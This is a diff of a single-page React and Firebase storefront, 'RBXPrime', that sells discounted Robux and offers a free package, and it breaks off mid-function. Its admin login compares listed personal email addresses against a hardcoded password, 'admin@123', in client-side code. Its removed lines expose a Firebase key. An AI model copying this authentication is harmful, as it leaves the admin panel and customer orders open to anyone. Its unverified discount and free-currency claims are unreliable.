@@ -1,651 +1,705 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RBXPrime - Premium Robux Store</title>
-    
-    <!-- React & ReactDOM -->
-    <script src="https://unpkg.com/react@18/umd/react.development.js" crossorigin></script>
-    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js" crossorigin></script>
-    
-    <!-- Babel for JSX -->
-    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-    
-    <!-- Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    fontFamily: {
-                        sans: ['Inter', 'sans-serif'],
-                    },
-                }
-            }
-        }
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RBXPrime - Premium Robux Store</title>
+    
+    <!-- React & ReactDOM -->
+    <script src="https://unpkg.com/react@18/umd/react.development.js" crossorigin></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js" crossorigin></script>
+    
+    <!-- Babel for JSX -->
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    animation: {
+                        'spin-slow': 'spin 3s linear infinite',
+                    }
+                }
+            }
+        }
+    </script>
 
-    <!-- Firebase SDKs -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, updateDoc, doc, deleteDoc, serverTimestamp, getDocs, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-        import { getAuth, signInAnonymously, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+    <!-- Firebase SDKs (Environment Compatible) -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getFirestore, collection, addDoc, onSnapshot, updateDoc, doc, deleteDoc, serverTimestamp, getDocs, setDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged, signOut, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
 
-        // --- FIREBASE CONFIG ---
-        const firebaseConfig = {
-            apiKey: "AIzaSyA7qxl9CLdGlzo85dCI58KUqr1NgWDEqr4",
-            authDomain: "ehehehe-7439f.firebaseapp.com",
-            projectId: "ehehehe-7439f",
-            storageBucket: "ehehehe-7439f.firebasestorage.app",
-            messagingSenderId: "160347546041",
-            appId: "1:160347546041:web:4cd69af7fe814660405668"
-        };
+        // --- FIREBASE CONFIG ---
+        // Using environment config to ensure it runs in the preview
+        const firebaseConfig = JSON.parse(__firebase_config);
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
 
-        // Initialize Firebase
-        let app, db, auth;
-        try {
-            app = initializeApp(firebaseConfig);
-            db = getFirestore(app);
-            auth = getAuth(app);
-            window.db = db;
-            window.auth = auth;
-            window.firebaseFunctions = { collection, addDoc, onSnapshot, query, orderBy, updateDoc, deleteDoc, doc, serverTimestamp, signInAnonymously, signInWithEmailAndPassword, signOut, onAuthStateChanged, getDocs, where };
-        } catch (e) {
-            console.error("Firebase Init Error:", e);
-        }
-    </script>
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const auth = getAuth(app);
 
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
-        
-        body { font-family: 'Inter', sans-serif; }
-        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
-        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0.05); }
-        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.2); border-radius: 4px; }
-        
-        @keyframes enter {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .animate-in { animation: enter 0.5s ease-out forwards; }
-    </style>
+        // Expose to window for React
+        window.db = db;
+        window.auth = auth;
+        window.appId = appId;
+        // Simplified mapping for the app's logic
+        window.firebaseFunctions = { 
+            collection, addDoc, onSnapshot, updateDoc, deleteDoc, doc, 
+            serverTimestamp, signInAnonymously, signOut, onAuthStateChanged, 
+            getDocs, setDoc, signInWithCustomToken 
+        };
+    </script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        
+        body { font-family: 'Inter', sans-serif; background-color: #050505; color: white; }
+        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
+        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0.05); }
+        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.2); border-radius: 4px; }
+        
+        @keyframes enter {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .animate-in { animation: enter 0.5s ease-out forwards; }
+        
+        /* Glassmorphism helpers */
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+    </style>
 </head>
 <body class="bg-[#050505] text-white">
-    <div id="root"></div>
+    <div id="root"></div>
 
-    <script type="text/babel">
-        const { useState, useEffect } = React;
+    <script type="text/babel">
+        const { useState, useEffect } = React;
 
-        // Access Firebase
-        const getDb = () => window.db;
-        const getAuth = () => window.auth;
-        const getFb = () => window.firebaseFunctions;
+        // Access Firebase
+        const getDb = () => window.db;
+        const getAuth = () => window.auth;
+        const getFb = () => window.firebaseFunctions;
+        const getAppId = () => window.appId;
 
-        // --- SECURITY: ALLOWED ADMIN EMAILS ---
-        const ALLOWED_ADMINS = [
-            "zeyamalam@gmail.com",
-            "okbhai935@gmail.com"
-        ];
+        // Path Helpers
+        const getPublicCollection = (collName) => {
+            const fb = getFb();
+            const db = getDb();
+            const appId = getAppId();
+            return fb.collection(db, 'artifacts', appId, 'public', 'data', collName);
+        };
 
-        // --- ICONS ---
-        const Icon = ({ path, className, fill = "none" }) => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill={fill} stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>{path}</svg>;
-        const ShoppingCart = (p) => <Icon {...p} path={<><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></>} />;
-        const Star = (p) => <Icon {...p} fill={p.fill || "none"} path={<polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>} />;
-        const ShieldCheck = (p) => <Icon {...p} path={<><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></>} />;
-        const Zap = (p) => <Icon {...p} fill={p.fill || "none"} path={<polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>} />;
-        const Menu = (p) => <Icon {...p} path={<><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="18" y2="18"/></>} />;
-        const X = (p) => <Icon {...p} path={<><path d="M18 6 6 18"/><path d="m6 6 12 12"/></>} />;
-        const Trash2 = (p) => <Icon {...p} path={<><path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/><line x1="10" x2="10" y1="11" y2="17"/><line x1="14" x2="14" y1="11" y2="17"/></>} />;
-        const CreditCard = (p) => <Icon {...p} path={<><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></>} />;
-        const User = (p) => <Icon {...p} path={<><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></>} />;
-        const Check = (p) => <Icon {...p} path={<polyline points="20 6 9 17 4 12"/>} />;
-        const Users = (p) => <Icon {...p} path={<><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></>} />;
-        const Activity = (p) => <Icon {...p} path={<polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>} />;
-        const ArrowLeft = (p) => <Icon {...p} path={<><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></>} />;
-        const Lock = (p) => <Icon {...p} path={<><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></>} />;
-        const Loader2 = (p) => <Icon {...p} className={`${p.className || ''} animate-spin`} path={<path d="M21 12a9 9 0 1 1-6.219-8.56"/>} />;
-        const Mail = (p) => <Icon {...p} path={<><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></>} />;
-        const Smartphone = (p) => <Icon {...p} path={<rect width="14" height="20" x="5" y="2" rx="2" ry="2"/>} />;
-        const AlertTriangle = (p) => <Icon {...p} path={<path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/>} />;
-        const ChevronRight = (p) => <Icon {...p} path={<path d="m9 18 6-6-6-6"/>} />;
-        const Signal = (p) => <Icon {...p} path={<><path d="M2 20h.01"/><path d="M7 20v-4"/><path d="M12 20v-8"/><path d="M17 20V8"/><path d="M22 4v16"/></>} />;
-        const Database = (p) => <Icon {...p} path={<><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></>} />;
-        const LogIn = (p) => <Icon {...p} path={<><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" x2="3" y1="12" y2="12"/></>} />;
-        const Ticket = (p) => <Icon {...p} path={<path d="M2 9a3 3 0 0 1 0 6v2a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-2a3 3 0 0 1 0-6V7a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2Z"/>} />;
-        const Plus = (p) => <Icon {...p} path={<><line x1="12" y1="5" x2="12" y2="19" /><line x1="5" y1="12" x2="19" y2="12" /></>} />;
-        const Headphones = (p) => <Icon {...p} path={<><path d="M3 18v-6a9 9 0 0 1 18 0v6"/><path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"/></>} />;
+        const getPublicDoc = (collName, docId) => {
+            const fb = getFb();
+            const db = getDb();
+            const appId = getAppId();
+            return fb.doc(db, 'artifacts', appId, 'public', 'data', collName, docId);
+        };
 
-        // Custom Robux Logo - Updated to solid hexagon with square hole
-        const RobuxLogo = (p) => (
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" {...p}>
-                <path fillRule="evenodd" d="M12 2L2 7.77V16.23L12 22L22 16.23V7.77L12 2ZM9 9H15V15H9V9Z" clipRule="evenodd" />
-            </svg>
-        );
+        // --- SECURITY: ALLOWED ADMIN EMAILS ---
+        const ALLOWED_ADMINS = [
+            "zeyamalam@gmail.com",
+            "okbhai935@gmail.com"
+        ];
 
-        // --- DATA ---
-        const robuxPackages = [
-            { id: 0, amount: 125, price: 0.00, bonus: '0', popular: true, tag: 'New Registered User Offer' },
-            { id: 1, amount: 800, price: 1.99, bonus: '100', popular: false },
-            { id: 2, amount: 1700, price: 3.99, bonus: '200', popular: true },
-            { id: 3, amount: 4500, price: 8.99, bonus: '500', popular: false },
-            { id: 4, amount: 10000, price: 18.99, bonus: '1200', popular: false },
-            { id: 5, amount: 22500, price: 39.99, bonus: '3000', popular: false },
-        ];
+        // --- ICONS ---
+        const Icon = ({ path, className, fill = "none" }) => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill={fill} stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>{path}</svg>;
+        const ShoppingCart = (p) => <Icon {...p} path={<><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></>} />;
+        const Star = (p) => <Icon {...p} fill={p.fill || "none"} path={<polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>} />;
+        const ShieldCheck = (p) => <Icon {...p} path={<><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></>} />;
+        const Zap = (p) => <Icon {...p} fill={p.fill || "none"} path={<polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>} />;
+        const Menu = (p) => <Icon {...p} path={<><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="18" y2="18"/></>} />;
+        const X = (p) => <Icon {...p} path={<><path d="M18 6 6 18"/><path d="m6 6 12 12"/></>} />;
+        const Trash2 = (p) => <Icon {...p} path={<><path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/><line x1="10" x2="10" y1="11" y2="17"/><line x1="14" x2="14" y1="11" y2="17"/></>} />;
+        const CreditCard = (p) => <Icon {...p} path={<><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></>} />;
+        const User = (p) => <Icon {...p} path={<><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></>} />;
+        const Check = (p) => <Icon {...p} path={<polyline points="20 6 9 17 4 12"/>} />;
+        const Users = (p) => <Icon {...p} path={<><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></>} />;
+        const Activity = (p) => <Icon {...p} path={<polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>} />;
+        const ArrowLeft = (p) => <Icon {...p} path={<><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></>} />;
+        const Lock = (p) => <Icon {...p} path={<><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></>} />;
+        const Loader2 = (p) => <Icon {...p} className={`${p.className || ''} animate-spin`} path={<path d="M21 12a9 9 0 1 1-6.219-8.56"/>} />;
+        const Mail = (p) => <Icon {...p} path={<><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></>} />;
+        const Smartphone = (p) => <Icon {...p} path={<rect width="14" height="20" x="5" y="2" rx="2" ry="2"/>} />;
+        const AlertTriangle = (p) => <Icon {...p} path={<path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/>} />;
+        const ChevronRight = (p) => <Icon {...p} path={<path d="m9 18 6-6-6-6"/>} />;
+        const Signal = (p) => <Icon {...p} path={<><path d="M2 20h.01"/><path d="M7 20v-4"/><path d="M12 20v-8"/><path d="M17 20V8"/><path d="M22 4v16"/></>} />;
+        const Database = (p) => <Icon {...p} path={<><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></>} />;
+        const LogIn = (p) => <Icon {...p} path={<><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" x2="3" y1="12" y2="12"/></>} />;
+        const Ticket = (p) => <Icon {...p} path={<path d="M2 9a3 3 0 0 1 0 6v2a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-2a3 3 0 0 1 0-6V7a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2Z"/>} />;
+        const Plus = (p) => <Icon {...p} path={<><line x1="12" y1="5" x2="12" y2="19" /><line x1="5" y1="12" x2="19" y2="12" /></>} />;
+        const Headphones = (p) => <Icon {...p} path={<><path d="M3 18v-6a9 9 0 0 1 18 0v6"/><path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"/></>} />;
 
-        const premiumFeatures = [
-            { icon: <Zap className="w-6 h-6 text-white" />, title: "Instant Delivery", desc: "Robux are transferred to your account within seconds." },
-            { icon: <ShieldCheck className="w-6 h-6 text-white" />, title: "Secure & Safe", desc: "No password required. We only need your username." },
-            { icon: <Star className="w-6 h-6 text-white" />, title: "30% OFF", desc: "Enjoy 30% OFF official store prices on all packages." },
-        ];
+        // Custom Robux Logo
+        const RobuxLogo = (p) => (
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" {...p}>
+                <path fillRule="evenodd" d="M12 2L2 7.77V16.23L12 22L22 16.23V7.77L12 2ZM9 9H15V15H9V9Z" clipRule="evenodd" />
+            </svg>
+        );
 
-        // --- CUSTOM NOTIFICATION POPUP ---
-        const Popup = ({ message, type, onClose }) => (
-            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-[200] flex items-center justify-center p-4 animate-in">
-                <div className="bg-[#111] w-full max-w-sm p-6 rounded-2xl border border-white/10 relative text-center shadow-2xl">
-                    <button onClick={onClose} className="absolute top-4 right-4 text-gray-400 hover:text-white"><X className="w-5 h-5" /></button>
-                    <div className={`w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-4 ${type === 'error' ? 'bg-red-500/10 text-red-500' : 'bg-green-500/10 text-green-500'}`}>
-                        {type === 'error' ? <AlertTriangle className="w-6 h-6" /> : <Check className="w-6 h-6" />}
-                    </div>
-                    <h3 className="text-lg font-bold text-white mb-2">{type === 'error' ? 'Error' : 'Success'}</h3>
-                    <p className="text-gray-400 text-sm mb-6">{message}</p>
-                    <button onClick={onClose} className="w-full py-3 bg-white text-black font-bold rounded-lg hover:bg-gray-200">
-                        Okay
-                    </button>
-                </div>
-            </div>
-        );
+        // --- DATA ---
+        const robuxPackages = [
+            { id: 0, amount: 125, price: 0.00, bonus: '0', popular: true, tag: 'New Registered User Offer' },
+            { id: 1, amount: 800, price: 1.99, bonus: '100', popular: false },
+            { id: 2, amount: 1700, price: 3.99, bonus: '200', popular: true },
+            { id: 3, amount: 4500, price: 8.99, bonus: '500', popular: false },
+            { id: 4, amount: 10000, price: 18.99, bonus: '1200', popular: false },
+            { id: 5, amount: 22500, price: 39.99, bonus: '3000', popular: false },
+        ];
 
-        // --- SUPPORT MODAL ---
-        const SupportModal = ({ onClose }) => (
-            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-[100] flex items-center justify-center p-4 animate-in">
-                <div className="bg-[#111] w-full max-w-sm p-6 rounded-2xl border border-white/10 relative text-center">
-                    <button onClick={onClose} className="absolute top-4 right-4 text-gray-400 hover:text-white"><X className="w-5 h-5" /></button>
-                    <div className="w-12 h-12 rounded-full bg-blue-500/10 text-blue-500 flex items-center justify-center mx-auto mb-4">
-                        <Headphones className="w-6 h-6" />
-                    </div>
-                    <h2 className="text-xl font-bold mb-2">Contact Support</h2>
-                    <div className="bg-white/5 p-3 rounded-lg mb-4 border border-white/10">
-                        <p className="text-sm text-gray-400 mb-1">Email Us At</p>
-                        <p className="text-white font-mono select-all">rbxprime@support.com</p>
-                    </div>
-                    <p className="text-sm text-gray-400">Our team will contact u in just 1 hour.</p>
-                </div>
-            </div>
-        );
+        // --- CUSTOM NOTIFICATION POPUP ---
+        const Popup = ({ message, type, onClose }) => (
+            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-[200] flex items-center justify-center p-4 animate-in">
+                <div className="bg-[#111] w-full max-w-sm p-6 rounded-2xl border border-white/10 relative text-center shadow-2xl">
+                    <button onClick={onClose} className="absolute top-4 right-4 text-gray-400 hover:text-white"><X className="w-5 h-5" /></button>
+                    <div className={`w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-4 ${type === 'error' ? 'bg-red-500/10 text-red-500' : 'bg-green-500/10 text-green-500'}`}>
+                        {type === 'error' ? <AlertTriangle className="w-6 h-6" /> : <Check className="w-6 h-6" />}
+                    </div>
+                    <h3 className="text-lg font-bold text-white mb-2">{type === 'error' ? 'Error' : 'Success'}</h3>
+                    <p className="text-gray-400 text-sm mb-6">{message}</p>
+                    <button onClick={onClose} className="w-full py-3 bg-white text-black font-bold rounded-lg hover:bg-gray-200">
+                        Okay
+                    </button>
+                </div>
+            </div>
+        );
 
-        // --- LOGIN MODAL ---
-        const LoginModal = ({ onClose, onLogin, showNotification }) => {
-            const [email, setEmail] = useState('');
-            const [password, setPassword] = useState('');
+        // --- SUPPORT MODAL ---
+        const SupportModal = ({ onClose }) => (
+            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-[100] flex items-center justify-center p-4 animate-in">
+                <div className="bg-[#111] w-full max-w-sm p-6 rounded-2xl border border-white/10 relative text-center">
+                    <button onClick={onClose} className="absolute top-4 right-4 text-gray-400 hover:text-white"><X className="w-5 h-5" /></button>
+                    <div className="w-12 h-12 rounded-full bg-blue-500/10 text-blue-500 flex items-center justify-center mx-auto mb-4">
+                        <Headphones className="w-6 h-6" />
+                    </div>
+                    <h2 className="text-xl font-bold mb-2">Contact Support</h2>
+                    <div className="bg-white/5 p-3 rounded-lg mb-4 border border-white/10">
+                        <p className="text-sm text-gray-400 mb-1">Email Us At</p>
+                        <p className="text-white font-mono select-all">rbxprime@support.com</p>
+                    </div>
+                    <p className="text-sm text-gray-400">Our team will contact u in just 1 hour.</p>
+                </div>
+            </div>
+        );
 
-            const handleSubmit = async (e) => {
-                e.preventDefault();
-                if(!email) { showNotification("Please enter an email.", "error"); return; }
-                
-                if (ALLOWED_ADMINS.includes(email)) {
-                    if (password === "admin@123") {
-                        onLogin(email);
-                    } else {
-                        showNotification("Invalid password.", "error");
-                    }
-                } else {
-                    showNotification("Access Denied: You are not an admin.", "error");
-                }
-            };
+        // --- LOGIN MODAL ---
+        const LoginModal = ({ onClose, onLogin, showNotification }) => {
+            const [email, setEmail] = useState('');
+            const [password, setPassword] = useState('');
 
-            return (
-                <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-[100] flex items-center justify-center p-4 animate-in">
-                    <div className="bg-[#111] w-full max-w-sm p-6 rounded-2xl border border-white/10 relative">
-                        <button onClick={onClose} className="absolute top-4 right-4 text-gray-400 hover:text-white"><X className="w-5 h-5" /></button>
-                        <h2 className="text-xl font-bold mb-4 flex items-center gap-2"><User className="w-5 h-5 text-yellow-400" /> Admin Login</h2>
-                        <form onSubmit={handleSubmit} className="space-y-4">
-                            <div><label className="text-sm text-gray-400 block mb-1">Email</label><input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="your@email.com" className="w-full bg-black border border-white/20 rounded-lg p-3 text-white focus:border-yellow-400 outline-none" autoFocus/></div>
-                            {ALLOWED_ADMINS.includes(email) && <div><label className="text-sm text-gray-400 block mb-1">Password</label><input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="••••••••" className="w-full bg-black border border-white/20 rounded-lg p-3 text-white focus:border-yellow-400 outline-none"/></div>}
-                            <button className="w-full py-3 bg-white text-black font-bold rounded-lg hover:bg-gray-200">Login</button>
-                        </form>
-                    </div>
-                </div>
-            );
-        };
+            const handleSubmit = async (e) => {
+                e.preventDefault();
+                if(!email) { showNotification("Please enter an email.", "error"); return; }
+                
+                if (ALLOWED_ADMINS.includes(email)) {
+                    if (password === "admin@123") {
+                        onLogin(email);
+                    } else {
+                        showNotification("Invalid password.", "error");
+                    }
+                } else {
+                    showNotification("Access Denied: You are not an admin.", "error");
+                }
+            };
 
-        // --- ADMIN PANEL ---
-        const AdminPanel = ({ onBack, showNotification }) => {
-            const [orders, setOrders] = useState([]);
-            const [referrals, setReferrals] = useState([]);
-            const [newCode, setNewCode] = useState('');
-            const [activeTab, setActiveTab] = useState('orders');
+            return (
+                <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-[100] flex items-center justify-center p-4 animate-in">
+                    <div className="bg-[#111] w-full max-w-sm p-6 rounded-2xl border border-white/10 relative">
+                        <button onClick={onClose} className="absolute top-4 right-4 text-gray-400 hover:text-white"><X className="w-5 h-5" /></button>
+                        <h2 className="text-xl font-bold mb-4 flex items-center gap-2"><User className="w-5 h-5 text-yellow-400" /> Admin Login</h2>
+                        <form onSubmit={handleSubmit} className="space-y-4">
+                            <div><label className="text-sm text-gray-400 block mb-1">Email</label><input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="your@email.com" className="w-full bg-black border border-white/20 rounded-lg p-3 text-white focus:border-yellow-400 outline-none" autoFocus/></div>
+                            {ALLOWED_ADMINS.includes(email) && <div><label className="text-sm text-gray-400 block mb-1">Password</label><input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="••••••••" className="w-full bg-black border border-white/20 rounded-lg p-3 text-white focus:border-yellow-400 outline-none"/></div>}
+                            <button className="w-full py-3 bg-white text-black font-bold rounded-lg hover:bg-gray-200">Login</button>
+                        </form>
+                    </div>
+                </div>
+            );
+        };
 
-            useEffect(() => {
-                const fb = getFb();
-                const db = getDb();
-                if (!db) return;
+        // --- ADMIN PANEL ---
+        const AdminPanel = ({ onBack, showNotification }) => {
+            const [orders, setOrders] = useState([]);
+            const [referrals, setReferrals] = useState([]);
+            const [newCode, setNewCode] = useState('');
+            const [activeTab, setActiveTab] = useState('orders');
 
-                const qOrders = fb.query(fb.collection(db, "orders"), fb.orderBy("timestamp", "desc"));
-                const unsubOrders = fb.onSnapshot(qOrders, (snapshot) => {
-                    setOrders(snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })));
-                });
+            useEffect(() => {
+                const fb = getFb();
+                const db = getDb();
+                if (!db) return;
 
-                const qReferrals = fb.query(fb.collection(db, "referral_codes"), fb.orderBy("timestamp", "desc"));
-                const unsubReferrals = fb.onSnapshot(qReferrals, (snapshot) => {
-                    setReferrals(snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })));
-                });
+                // Rule compliance: Fetch all and sort in memory
+                const qOrders = getPublicCollection("orders");
+                const unsubOrders = fb.onSnapshot(qOrders, 
+                    (snapshot) => {
+                        const rawOrders = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                        rawOrders.sort((a, b) => {
+                            const tA = a.timestamp?.seconds || 0;
+                            const tB = b.timestamp?.seconds || 0;
+                            return tB - tA;
+                        });
+                        setOrders(rawOrders);
+                    },
+                    (error) => console.error("Order fetch error:", error)
+                );
 
-                return () => { unsubOrders(); unsubReferrals(); };
-            }, []);
+                const qReferrals = getPublicCollection("referral_codes");
+                const unsubReferrals = fb.onSnapshot(qReferrals, 
+                    (snapshot) => {
+                        const rawRef = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                        rawRef.sort((a, b) => {
+                            const tA = a.timestamp?.seconds || 0;
+                            const tB = b.timestamp?.seconds || 0;
+                            return tB - tA;
+                        });
+                        setReferrals(rawRef);
+                    },
+                    (error) => console.error("Ref fetch error:", error)
+                );
 
-            const handleDelete = async (orderId) => {
-                if(!confirm("Are you sure you want to delete this order?")) return;
-                const fb = getFb();
-                const db = getDb();
-                try { await fb.deleteDoc(fb.doc(db, "orders", orderId)); } 
-                catch (e) { showNotification("Error deleting order.", "error"); }
-            };
+                return () => { unsubOrders(); unsubReferrals(); };
+            }, []);
 
-            const handleAddReferral = async (e) => {
-                e.preventDefault();
-                if (!newCode) return;
-                const fb = getFb();
-                const db = getDb();
-                try {
-                    await fb.addDoc(fb.collection(db, "referral_codes"), {
-                        code: newCode.toUpperCase(),
-                        timestamp: fb.serverTimestamp()
-                    });
-                    setNewCode('');
-                    showNotification("Referral code added!", "success");
-                } catch (e) {
-                    showNotification("Error creating referral code.", "error");
-                }
-            };
+            const handleDelete = async (orderId) => {
+                if(!confirm("Are you sure you want to delete this order?")) return;
+                const fb = getFb();
+                try { await fb.deleteDoc(getPublicDoc("orders", orderId)); } 
+                catch (e) { showNotification("Error deleting order.", "error"); }
+            };
 
-            const handleDeleteReferral = async (referralId) => {
-                if(!confirm("Delete this referral code?")) return;
-                const fb = getFb();
-                const db = getDb();
-                try { await fb.deleteDoc(fb.doc(db, "referral_codes", referralId)); } 
-                catch (e) { showNotification("Error deleting referral.", "error"); }
-            };
+            const handleAddReferral = async (e) => {
